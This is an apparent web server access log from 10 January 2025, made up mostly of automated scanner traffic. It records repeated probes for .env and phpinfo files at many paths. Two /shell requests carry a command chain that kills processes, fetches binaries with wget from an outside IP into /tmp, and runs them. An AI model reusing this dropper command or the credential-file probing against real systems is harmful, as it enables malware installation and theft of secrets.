78.153.140.93 - - [10/Jan/2025:00:04:13 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:00:04:14 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
59.15.168.115 - - [10/Jan/2025:00:04:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
171.5.208.113 - - [10/Jan/2025:00:22:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [10/Jan/2025:00:29:17 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:00:29:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [10/Jan/2025:00:50:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
118.172.199.156 - - [10/Jan/2025:00:53:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.178.110.108 - - [10/Jan/2025:01:23:54 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
195.178.110.108 - - [10/Jan/2025:01:24:44 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
95.214.55.226 - - [10/Jan/2025:01:26:43 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
114.32.231.45 - - [10/Jan/2025:01:35:43 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
179.43.191.146 - - [10/Jan/2025:01:39:06 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
93.174.93.12 - - [10/Jan/2025:01:52:47 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
78.153.140.93 - - [10/Jan/2025:01:53:36 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:01:53:37 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
59.4.71.51 - - [10/Jan/2025:02:08:17 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
185.247.137.238 - - [10/Jan/2025:02:12:03 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
185.16.39.104 - - [10/Jan/2025:02:26:33 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [10/Jan/2025:02:27:49 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:02:27:49 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
51.254.59.113 - - [10/Jan/2025:02:38:24 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
178.128.54.126 - - [10/Jan/2025:02:41:11 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [10/Jan/2025:02:41:21 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
178.128.54.126 - - [10/Jan/2025:02:50:50 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
178.128.54.126 - - [10/Jan/2025:02:51:00 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
78.153.140.93 - - [10/Jan/2025:02:52:04 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:02:52:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
152.42.219.47 - - [10/Jan/2025:02:56:46 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [10/Jan/2025:02:56:53 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
159.223.67.34 - - [10/Jan/2025:02:57:30 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
159.223.67.34 - - [10/Jan/2025:02:57:40 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
193.34.212.75 - - [10/Jan/2025:03:02:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
205.210.31.172 - - [10/Jan/2025:03:04:09 +0000] "\x16\x03\x01" 400 524 "-" "-"
205.210.31.172 - - [10/Jan/2025:03:04:09 +0000] "\x16\x03\x01" 400 524 "-" "-"
46.19.138.234 - - [10/Jan/2025:03:05:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
84.178.82.165 - - [10/Jan/2025:03:06:03 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
154.213.184.132 - - [10/Jan/2025:03:06:38 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
172.105.128.13 - - [10/Jan/2025:03:46:17 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.93 - - [10/Jan/2025:03:58:33 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:03:58:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
74.82.47.5 - - [10/Jan/2025:04:04:25 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0"
74.82.47.5 - - [10/Jan/2025:04:06:22 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)"
74.82.47.5 - - [10/Jan/2025:04:07:06 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/94.0.0.0"
95.214.55.186 - - [10/Jan/2025:04:07:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [10/Jan/2025:04:22:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
159.65.226.6 - - [10/Jan/2025:04:25:32 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1478.0 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:04:37:09 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:04:37:09 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
95.214.55.186 - - [10/Jan/2025:04:37:21 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [10/Jan/2025:04:41:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:04:41:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
125.142.163.191 - - [10/Jan/2025:04:48:58 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
91.223.3.201 - - [10/Jan/2025:04:49:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.139 - - [10/Jan/2025:04:49:34 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
211.38.68.219 - - [10/Jan/2025:04:54:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
222.149.142.169 - - [10/Jan/2025:05:02:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
221.147.103.203 - - [10/Jan/2025:05:17:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [10/Jan/2025:05:27:43 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:05:27:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
198.235.24.161 - - [10/Jan/2025:05:34:08 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
87.120.115.119 - - [10/Jan/2025:05:38:01 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "SearchExpress"
78.153.140.93 - - [10/Jan/2025:05:51:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:05:51:28 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:06:16:44 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:06:16:45 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
111.7.96.169 - - [10/Jan/2025:06:26:16 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
111.7.96.169 - - [10/Jan/2025:06:26:17 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.169 - - [10/Jan/2025:06:26:17 +0000] "GET /js/brand.js HTTP/1.1" 200 514 "http://34.93.54.196/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.169 - - [10/Jan/2025:06:26:17 +0000] "GET /js/login.js HTTP/1.1" 200 866 "http://34.93.54.196/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.169 - - [10/Jan/2025:06:26:27 +0000] "GET /js/utils/json-manipulator.js HTTP/1.1" 200 509 "http://34.93.54.196/js/brand.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.169 - - [10/Jan/2025:06:26:27 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 1289 "http://34.93.54.196/js/login.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.169 - - [10/Jan/2025:06:26:28 +0000] "GET /config/brand.json HTTP/1.1" 200 311 "http://34.93.54.196/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
111.7.96.169 - - [10/Jan/2025:06:26:30 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
111.7.96.169 - - [10/Jan/2025:06:26:30 +0000] "GET / HTTP/1.1" 200 947 "http://34.93.54.196/favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
95.214.55.226 - - [10/Jan/2025:06:33:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
198.235.24.134 - - [10/Jan/2025:06:35:07 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
193.34.212.75 - - [10/Jan/2025:06:36:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
107.140.18.145 - - [10/Jan/2025:07:06:04 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [10/Jan/2025:07:22:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:07:22:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
125.228.158.220 - - [10/Jan/2025:07:24:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.3.223.55 - - [10/Jan/2025:07:31:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.16.39.104 - - [10/Jan/2025:07:35:30 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [10/Jan/2025:07:44:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
64.62.197.142 - - [10/Jan/2025:07:51:21 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.149 - - [10/Jan/2025:07:51:50 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:07:51:51 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
141.98.11.119 - - [10/Jan/2025:07:53:43 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/141.98.10.40/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/141.98.10.40/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
179.43.191.146 - - [10/Jan/2025:07:55:15 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
18.216.130.143 - - [10/Jan/2025:07:55:18 +0000] "\x16\x03\x01" 400 524 "-" "-"
18.216.130.143 - - [10/Jan/2025:07:55:38 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
125.229.222.77 - - [10/Jan/2025:08:12:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [10/Jan/2025:08:12:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:08:12:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
162.239.157.161 - - [10/Jan/2025:08:17:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
35.187.186.25 - - [10/Jan/2025:08:28:47 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
45.156.129.135 - - [10/Jan/2025:08:33:18 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
141.98.11.119 - - [10/Jan/2025:08:34:49 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/141.98.10.40/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/141.98.10.40/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
91.223.3.201 - - [10/Jan/2025:08:39:06 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [10/Jan/2025:08:45:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [10/Jan/2025:08:45:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
154.213.184.132 - - [10/Jan/2025:09:04:34 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
78.153.140.93 - - [10/Jan/2025:09:04:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [10/Jan/2025:09:04:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.203 - - [10/Jan/2025:09:08:53 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.203 - - [10/Jan/2025:09:08:53 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.10) Gecko/20071203 Ubuntu/7.10 (gutsy) Firefox/2.0.0.10"
78.153.140.203 - - [10/Jan/2025:09:08:53 +0000] "GET /Demo/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0"
78.153.140.203 - - [10/Jan/2025:09:08:54 +0000] "GET /DEMO/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG SGH-T399N Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36"
78.153.140.203 - - [10/Jan/2025:09:08:54 +0000] "GET /Dev/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SAMSUNG-SGH-I547 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.203 - - [10/Jan/2025:09:08:54 +0000] "GET /DEV/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Moto G Build/N2G47O) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3095.0 Mobile Safari/537.36"
78.153.140.203 - - [10/Jan/2025:09:08:55 +0000] "GET /Doc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; CrOS i686 9.10.0; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Gecko/20100101 Firefox/29.0"
78.153.140.203 - - [10/Jan/2025:09:08:55 +0000] "GET /DOC/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36"
78.153.140.203 - - [10/Jan/2025:09:08:56 +0000] "GET /Docs/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 (.NET CLR 3.5.30729)"
78.153.140.203 - - [10/Jan/2025:09:08:56 +0000] "GET /DOCS/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36 OPR/24.0.1558.64 (Edition FCR)"
78.153.140.203 - - [10/Jan/2025:09:08:56 +0000] "GET /Download/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.1.2; fr-fr; GT-P5110 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30"
78.153.140.203 - - [10/Jan/2025:09:08:57 +0000] "GET /Env/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/10.0.1 Safari/601.3.9"
78.153.140.203 - - [10/Jan/2025:09:08:57 +0000] "GET /Html/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.0.4; en-ca; GT-S7560M-parrot Build/IMM76I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.203 - - [10/Jan/2025:09:08:57 +0000] "GET /Inc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/534.34 (KHTML, like Gecko) python Safari/534.34"
78.153.140.203 - - [10/Jan/2025:09:08:58 +0000] "GET /Infos/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36"
78.153.140.203 - - [10/Jan/2025:09:08:58 +0000] "GET /Lib/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36"
78.153.140.203 - - [10/Jan/2025:09:08:59 +0000] "GET /Library/.env HTTP/1.1" 302 331 "-" "More Firefox 2.0.0.3 user agents strings -->>"
78.153.140.203 - - [10/Jan/2025:09:08:59 +0000] "GET /Logging/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4"
78.153.140.203 - - [10/Jan/2025:09:08:59 +0000] "GET /Media/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36"
78.153.140.203 - - [10/Jan/2025:09:09:00 +0000] "GET /Misc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 6.0.1; LGLS676 Build/MXB48T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
78.153.140.203 - - [10/Jan/2025:09:09:00 +0000] "GET /New/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; wbx 1.0.0)"
78.153.140.203 - - [10/Jan/2025:09:09:01 +0000] "GET /Phpinfo.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.132 Safari/537.36"
78.153.140.203 - - [10/Jan/2025:09:09:01 +0000] "GET /PHPinfo.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2"
78.153.140.203 - - [10/Jan/2025:09:09:01 +0000] "GET /PHPINFO.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.414.0 Safari/534.1"
78.153.140.203 - - [10/Jan/2025:09:09:02 +0000] "GET /Production/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.4.2; en-us; SAMSUNG SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Safari/537.36"
